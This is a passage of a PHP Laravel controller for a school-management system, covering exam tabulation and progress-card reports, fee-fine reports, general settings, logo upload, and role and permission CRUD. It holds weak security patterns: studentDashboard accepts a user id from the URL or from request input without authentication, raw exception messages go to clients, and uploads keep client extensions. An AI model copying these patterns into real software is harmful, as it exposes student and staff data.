            $subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $grades = AramiscMarksGrade::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $class = AramiscClass::find($request->class);
            $section = AramiscSection::find($request->section);
            $exam_detail = AramiscExam::find($request->exam);
            $exam_id = $request->exam;
            $class_id = $request->class;

            return view('backEnd.reports.mark_sheet_report_student', compact('exam_types', 'optional_subject', 'classes', 'studentDetails', 'exams', 'classes', 'marks_register', 'subjects', 'class', 'section', 'exam_detail', 'grades', 'exam_id', 'class_id', 'student_detail', 'input'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function tabulationSheetReport(Request $request)
    {
        try {
            $exam_types = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exam_types'] = $exam_types->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.tabulation_sheet_report', compact('exam_types', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function tabulationSheetReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'exam' => 'required',
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $exam_term_id   = $request->exam;
            $class_id       = $request->class;
            $section_id     = $request->section;
            $student_id     = $request->student;

            $optional_subject_setup = AramiscClassOptionalSubject::where('class_id', '=', $request->class)->first();
            // return $optional_subject_setup;
            if ($request->student == "") {
                $eligible_subjects       = AramiscAssignSubject::where('class_id', $class_id)->where('section_id', $section_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $eligible_students       = AramiscStudent::where('class_id', $class_id)->where('section_id', $section_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                foreach ($eligible_students as $SingleStudent) {
                    foreach ($eligible_subjects as $subject) {


                        $getMark            =  AramiscResultStore::where([
                            ['exam_type_id',   $exam_term_id],
                            ['class_id',       $class_id],
                            ['section_id',     $section_id],
                            ['student_id',     $SingleStudent->id],
                            ['subject_id',     $subject->subject_id]
                        ])->first();


                        if ($getMark == "") {
                            return redirect()->back()->with('message-danger', 'Please register marks for all students.!');
                        }
                    }
                }
            } else {

                $eligible_subjects       = AramiscAssignSubject::where('class_id', $class_id)->where('section_id', $section_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                foreach ($eligible_subjects as $subject) {


                    $getMark            =  AramiscResultStore::where([
                        ['exam_type_id',   $exam_term_id],
                        ['class_id',       $class_id],
                        ['section_id',     $section_id],
                        ['student_id',     $request->student],
                        ['subject_id',     $subject->subject_id]
                    ])->first();


                    if ($getMark == "") {
                        return redirect()->back()->with('message-danger', 'Please register marks for all students.!');
                    }
                }
            }


            if ($request->student != '') {
                $marks      = AramiscMarkStore::where([
                    ['exam_term_id', $request->exam],
                    ['class_id', $request->class],
                    ['section_id', $request->section],
                    ['student_id', $request->student]
                ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $students   = AramiscStudent::where([
                    ['class_id', $request->class],
                    ['section_id', $request->section],
                    ['id', $request->student]
                ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                $subjects       = AramiscAssignSubject::where([
                    ['class_id', $request->class],
                    ['section_id', $request->section]
                ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                foreach ($subjects as $sub) {
                    $subject_list_name[] = $sub->subject->subject_name;
                }
                $grade_chart = AramiscMarksGrade::select('grade_name', 'gpa', 'percent_from as start', 'percent_upto as end', 'description')->where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get()->toArray();

                $single_student = AramiscStudent::find($request->student);
                $single_exam_term = AramiscExamType::find($request->exam);

                $tabulation_details['student_name'] = $single_student->full_name;
                $tabulation_details['student_roll'] = $single_student->roll_no;
                $tabulation_details['student_admission_no'] = $single_student->admission_no;
                $tabulation_details['student_class'] = $single_student->ClassName->class_name;
                $tabulation_details['student_section'] = $single_student->section->section_name;
                $tabulation_details['exam_term'] = $single_exam_term->title;
                $tabulation_details['subject_list'] = $subject_list_name;
                $tabulation_details['grade_chart'] = $grade_chart;
            } else {
                $marks = AramiscMarkStore::where([
                    ['exam_term_id', $request->exam],
                    ['class_id', $request->class],
                    ['section_id', $request->section]
                ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $students       = AramiscStudent::where([
                    ['class_id', $request->class],
                    ['section_id', $request->section]
                ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }


            $exam_types     = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes        = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $single_class   = AramiscClass::find($request->class);
            $single_section   = AramiscSection::find($request->section);
            $subjects       = AramiscAssignSubject::where([
                ['class_id', $request->class],
                ['section_id', $request->section]
            ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();


            foreach ($subjects as $sub) {
                $subject_list_name[] = $sub->subject->subject_name;
            }
            $grade_chart = AramiscMarksGrade::select('grade_name', 'gpa', 'percent_from as start', 'percent_upto as end', 'description')->where('active_status', 1)->get()->toArray();

            $single_exam_term = AramiscExamType::find($request->exam);

            $tabulation_details['student_class'] = $single_class->class_name;
            $tabulation_details['student_section'] = $single_section->section_name;
            $tabulation_details['exam_term'] = $single_exam_term->title;
            $tabulation_details['subject_list'] = $subject_list_name;
            $tabulation_details['grade_chart'] = $grade_chart;



            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exam_types'] = $exam_types->toArray();
                $data['classes'] = $classes->toArray();
                $data['marks'] = $marks->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['exam_term_id'] = $exam_term_id;
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['students'] = $students->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $get_class = AramiscClass::where('active_status', 1)
                ->where('id', $request->class)
                ->first();
            $get_section = AramiscSection::where('active_status', 1)
                ->where('id', $request->section)
                ->first();
            $class_name = $get_class->class_name;
            $section_name = $get_section->section_name;
            return view(
                'backEnd.reports.tabulation_sheet_report',
                compact('optional_subject_setup', 'exam_types', 'classes', 'marks', 'subjects', 'exam_term_id', 'class_id', 'section_id', 'class_name', 'section_name', 'students', 'student_id', 'tabulation_details')
            );
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function progressCardReport(Request $request)
    {
        try {
            $exams = AramiscExam::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['routes'] = $exams->toArray();
                $data['assign_vehicles'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.reports.progress_card_report', compact('exams', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function progressCardReportSearch(Request $request)
    {

        //input validations, 3 input must be required
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required',
            'student' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $exams = AramiscExam::where('active_status', 1)->where('class_id', $request->class)->where('section_id', $request->section)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $exam_types = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();


            $studentDetails = AramiscStudent::where('aramisc_students.id', '=', $request->student)
                ->join('aramisc_academic_years', 'aramisc_academic_years.id', '=', 'aramisc_students.session_id')
                ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_students.class_id')
                ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_students.section_id')
                ->first();

            $optional_subject_setup = AramiscClassOptionalSubject::where('class_id', '=', $request->class)->first();

            $student_optional_subject = AramiscOptionalSubjectAssign::where('student_id', $request->student)->where('session_id', '=', $studentDetails->session_id)->first();


            $exam_setup = AramiscExamSetup::where([['class_id', $request->class], ['section_id', $request->section]])->get();

            $class_id = $request->class;
            $section_id = $request->section;
            $student_id = $request->student;



            $subjects = AramiscAssignSubject::where([['class_id', $request->class], ['section_id', $request->section]])->get();



            $assinged_exam_types = [];
            foreach ($exams as $exam) {
                $assinged_exam_types[] = $exam->exam_type_id;
            }
            $assinged_exam_types = array_unique($assinged_exam_types);
            foreach ($assinged_exam_types as $assinged_exam_type) {
                foreach ($subjects as $subject) {
                    $is_mark_available = AramiscResultStore::where([['class_id', $request->class], ['section_id', $request->section], ['student_id', $request->student], ['subject_id', $subject->subject_id], ['exam_type_id', $assinged_exam_type]])->first();
                    // return $is_mark_available;
                    if ($is_mark_available == "") {
                        return redirect('progress-card-report')->with('message-danger', 'Ops! Your result is not found! Please check mark register.');
                    }
                }
            }


            $is_result_available = AramiscResultStore::where([['class_id', $request->class], ['section_id', $request->section], ['student_id', $request->student]])->get();


            if ($is_result_available->count() > 0) {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['exams'] = $exams->toArray();
                    $data['classes'] = $classes->toArray();
                    $data['studentDetails'] = $studentDetails;
                    $data['is_result_available'] = $is_result_available;
                    $data['subjects'] = $subjects->toArray();
                    $data['class_id'] = $class_id;
                    $data['section_id'] = $section_id;
                    $data['student_id'] = $student_id;
                    $data['exam_types'] = $exam_types;
                    return ApiBaseMethod::sendResponse($data, null);
                }


                return view('backEnd.reports.progress_card_report', compact('exams', 'optional_subject_setup', 'student_optional_subject', 'classes', 'studentDetails', 'is_result_available', 'subjects', 'class_id', 'section_id', 'student_id', 'exam_types', 'assinged_exam_types'));
            } else {
                return redirect('progress-card-report')->with('message-danger', 'Ops! Your result is not found! Please check mark register.');
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentFineReport(Request $request)
    {
        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, null);
            }
            return view('backEnd.reports.student_fine_report');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentFineReportSearch(Request $request)
    {
        try {
            $date_from = date('Y-m-d', strtotime($request->date_from));
            $date_to = date('Y-m-d', strtotime($request->date_to));
            $fees_payments = AramiscFeesPayment::where('payment_date', '>=', $date_from)->where('payment_date', '<=', $date_to)->where('fine', '!=', 0)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($fees_payments, null);
            }
            return view('backEnd.reports.student_fine_report', compact('fees_payments'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function userLog(Request $request)
    {
        try {
            $user_logs = AramiscUserLog::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($user_logs, null);
            }
            return view('backEnd.reports.user_log', compact('user_logs'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function generalSettingsView(Request $request, $school_id)
    {
        try {
            $editData = AramiscGeneralSettings::where('school_id', $school_id)->first();
            $modules = AramiscModuleManager::select('name')->get();
            foreach ($modules as $module) {
                $all_modules[] = $module->name;
            }
            session()->put('all_module', $all_modules);
            foreach ($modules as $module) {
                $editData->{$module->name} = moduleStatusCheck($module->name);
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($editData, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateGeneralSettings(Request $request)
    {

        try {
            $editData        = AramiscGeneralSettings::first();
            $session_ids     = AramiscAcademicYear::where('active_status', 1)->get();
            $dateFormats     = AramiscDateFormat::where('active_status', 1)->get();
            $languages       = AramiscLanguage::all();
            $countries       = AramiscCountry::select('currency')->distinct('currency')->get();
            $currencies      = AramiscCurrency::where('school_id',1)->get();
            $academic_years  = AramiscAcademicYear::all();
            $time_zones      = AramiscTimeZone::all();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data                = [];
                $data['editData']    = $editData;
                $data['session_ids'] = $session_ids->toArray();
                $data['dateFormats'] = $dateFormats->toArray();
                $data['languages']   = $languages->toArray();
                $data['countries']   = $countries->toArray();
                $data['currencies']  = $currencies->toArray();
                $data['academic_years']  = $academic_years->toArray();
                return ApiBaseMethod::sendResponse($data, 'apply leave');
            }
            return view('backEnd.systemSettings.updateGeneralSettings', compact('editData', 'session_ids', 'dateFormats', 'languages', 'countries', 'currencies', 'academic_years', 'time_zones'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateGeneralSettingsData(Request $request)
    {

        $input = $request->all();

        $validator = Validator::make($input, [
            'school_name'     => "required",
            'site_title'      => "required",
            'phone'           => "required",
            'email'           => "required",
            'session_id'      => "required",
            'language_id'     => "required",
            'date_format_id'  => "required",
            'currency'        => "required",
            'currency_symbol' => "required",
            'school_code' => "required",
            'time_zone' => "required",

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $id                               = 1;
            $generalSettData                  = AramiscGeneralSettings::find($id);
            $generalSettData->school_name     = $request->school_name;
            $generalSettData->site_title      = $request->site_title;
            $generalSettData->school_code     = $request->school_code;
            $generalSettData->address         = $request->address;
            $generalSettData->phone           = $request->phone;
            $generalSettData->email           = $request->email;
            $generalSettData->session_id      = $request->session_id;
            $generalSettData->language_id     = $request->language_id;
            $generalSettData->date_format_id  = $request->date_format_id;
            $generalSettData->currency        = $request->currency;
            $generalSettData->currency_symbol = $request->currency_symbol;
            $generalSettData->time_zone_id = $request->time_zone;

            $generalSettData->copyright_text = $request->copyright_text;

            $results = $generalSettData->save();


            if ($generalSettData->timeZone != "") {
                $value1 = $generalSettData->timeZone->time_zone;



                $key1 = 'APP_TIMEZONE';

                $path            = base_path() . "/.env";
                $APP_TIMEZONE       = env($key1);

                if (file_exists($path)) {
                    file_put_contents($path, str_replace(
                        "$key1=" . $APP_TIMEZONE,
                        "$key1=" . $value1,
                        file_get_contents($path)
                    ));
                }
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($results) {
                    return ApiBaseMethod::sendResponse(null, 'General Settings has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($results) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('general-settings');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateSchoolLogo(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'main_school_logo' => "sometimes|nullable|mimes:jpg,jpeg,png|max:50000",
            'main_school_favicon' => "sometimes|nullable|mimes:jpg,jpeg,png|max:50000",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {

            if ($request->file('main_school_logo') != "") {
                $main_school_logo = "";
                $file             = $request->file('main_school_logo');
                $main_school_logo = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/settings/', $main_school_logo);
                $main_school_logo      = 'public/uploads/settings/' . $main_school_logo;
                $generalSettData       = AramiscGeneralSettings::find(1);
                $generalSettData->logo = $main_school_logo;
                $results               = $generalSettData->update();
            }

            else if ($request->file('main_school_favicon') != "") {
                $main_school_favicon = "";
                $file                = $request->file('main_school_favicon');
                $main_school_favicon = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/settings/', $main_school_favicon);
                $main_school_favicon      = 'public/uploads/settings/' . $main_school_favicon;
                $generalSettData          = AramiscGeneralSettings::find(1);
                $generalSettData->favicon = $main_school_favicon;
                $results                  = $generalSettData->update();
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No change applied, please try again');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
            if ($results) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Logo has been updated successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function role_index(Request $request)
    {
        try {
            $roles = AramiscRole::where('active_status', '=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 9)->orderBy('id', 'desc')->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.systemSettings.role.role', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function role_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $role = new Role();
            $role->name = $request->name;
            $role->type = 'User Defined';
            $result = $role->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Role has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function role_edit(Request $request, $id)
    {
        try {
            $role = AramiscRole::find($id);
            $roles = AramiscRole::where('active_status', '=', 1)->orderBy('id', 'desc')->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['role'] = $role;
                $data['roles'] = $roles->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.systemSettings.role.role', compact('role', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function role_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $role = AramiscRole::find($request->id);
            $role->name = $request->name;
            $result = $role->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Role has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function role_delete(Request $request)
    {


        $id = 'role_id';

        $tables = tableList::getTableList($id,$request->id);

        try {
            $delete_query = AramiscRole::destroy($request->id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($delete_query) {
                    return ApiBaseMethod::sendResponse(null, 'Role has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($delete_query) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Illuminate\Database\QueryException $e) {
            $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
            Toastr::error('This item already used', 'Failed');
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignPermission(Request $request, $id)
    {


        try {
            $role = AramiscRole::find($id);
            $modulesRole = AramiscModule::where('active_status', 1)->get();
            $role_permissions = AramiscRolePermission::where('role_id', $id)->get();
            $already_assigned = [];
            foreach ($role_permissions as $role_permission) {
                $already_assigned[] = $role_permission->module_link_id;
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['role'] = $role;
                $data['modules'] = $modulesRole->toArray();
                $data['already_assigned'] = $already_assigned;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.systemSettings.role.assign_role_permission', compact('role', 'modulesRole', 'already_assigned'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function rolePermissionStore(Request $request)
    {
        try {
            AramiscRolePermission::where('role_id', $request->role_id)->delete();

            if (isset($request->permissions)) {
                foreach ($request->permissions as $permission) {
                    $role_permission = new AramiscRolePermission();
                    $role_permission->role_id = $request->role_id;
                    $role_permission->module_link_id = $permission;
                    $role_permission->save();
                }
            }
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Role permission has been assigned successfully');
            }
            return redirect('role')->with('message-success-delete', 'Role permission has been assigned successfully');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function base_group_index(Request $request)
    {
        try {
            $base_groups = AramiscBaseGroup::where('active_status', '=', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($base_groups, null);
            }
            return view('backEnd.systemSettings.baseSetup.base_group', compact('base_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function base_group_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $base_group = new AramiscBaseGroup();
            $base_group->name = $request->name;
            $result = $base_group->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Base Group has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Base Group has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function base_group_edit(Request $request, $id)
    {
        try {
            $base_group = AramiscBaseGroup::find($id);
            $base_groups = AramiscBaseGroup::where('active_status', '=', 1)->orderBy('id', 'desc')->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['base_group'] = $base_group;
                $data['base_groups'] = $base_groups->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.systemSettings.baseSetup.base_group', compact('base_group', 'base_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function base_group_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $base_group = AramiscBaseGroup::find($request->id);
            $base_group->name = $request->name;
            $result = $base_group->save();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Base Group has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Base Group has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function base_group_delete(Request $request, $id)
    {

        try {
            $id = 'base_group_id';
            $tables = tableList::getTableList($id,$request->id);
            try {
                $result = $delete_query = AramiscBaseGroup::destroy($request->id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($result) {
                        return ApiBaseMethod::sendResponse(null, 'Base group has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        return redirect()->back()->with('message-success-delete', 'Class has been deleted successfully');
                    } else {
                        return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
        }
    }
    public function deleteHolidayView(Request $request, $id)
    {


        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.holidays.deleteHolidayView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteHoliday(Request $request, $id)
    {

        try {
            $holiday = AramiscHoliday::find($id);
            if ($holiday->upload_image_file != "") {
                unlink($holiday->upload_image_file);
            }
            $result = $holiday->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Holiday has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }









    public function studentDashboard(Request $request, $id = null)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $user_id = $id;
        } else {
            $user = Auth::user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->user_id;
            }
        }

        $student_detail = AramiscStudent::where('user_id', $user_id)->first();
        $driver = AramiscVehicle::where('aramisc_vehicles.id', '=', $student_detail->vechile_id)
            ->join('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_vehicles.driver_id')
            ->first();
        $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)->get();
